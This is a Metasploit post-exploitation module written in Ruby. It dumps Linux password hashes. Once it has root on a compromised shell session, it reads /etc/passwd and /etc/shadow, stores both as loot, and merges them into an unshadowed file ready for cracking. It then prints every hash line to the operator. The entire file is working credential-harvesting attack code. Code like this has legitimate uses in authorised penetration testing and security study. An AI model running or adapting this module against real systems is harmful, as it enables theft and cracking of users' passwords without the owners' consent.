##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'

class Metasploit3 < Msf::Post

  include Msf::Post::File
  include Msf::Post::Linux::Priv

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'Linux Gather Dump Password Hashes for Linux Systems',
        'Description'   => %q{ Post Module to dump the password hashes for all users on a Linux System},
        'License'       => MSF_LICENSE,
        'Author'        => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],
        'Platform'      => [ 'linux' ],
        'SessionTypes'  => [ 'shell' ]
      ))

  end

  # Run Method for when run command is issued
  def run
    if is_root?
      passwd_file = read_file("/etc/passwd")
      shadow_file = read_file("/etc/shadow")

      # Save in loot the passwd and shadow file
      p1 = store_loot("linux.shadow", "text/plain", session, shadow_file, "shadow.tx", "Linux Password Shadow File")
      p2 = store_loot("linux.passwd", "text/plain", session, passwd_file, "passwd.tx", "Linux Passwd File")
      vprint_status("Shadow saved in: #{p1.to_s}")
      vprint_status("passwd saved in: #{p2.to_s}")

      # Unshadow the files
      john_file = unshadow(passwd_file, shadow_file)
      john_file.each_line do |l|
        print_good(l.chomp)
      end
      # Save pwd file
      upassf = store_loot("linux.hashes", "text/plain", session, john_file, "unshadowed_passwd.pwd", "Linux Unshadowed Password File")
      print_good("Unshadowed Password File: #{upassf}")

    else
      print_error("You must run this module as root!")
    end

  end

  def unshadow(pf,sf)
    unshadowed = ""
    sf.each_line do |sl|
      pass = sl.scan(/^\w*:([^:]*)/).join
      if pass !~ /^\*|^!$/
        user = sl.scan(/(^\w*):/).join
        pf.each_line do |pl|
          if pl.match(/^#{user}:/)
            unshadowed << pl.gsub(/:x:/,":#{pass}:")
          end
        end
      end
    end
    return unshadowed
  end
end
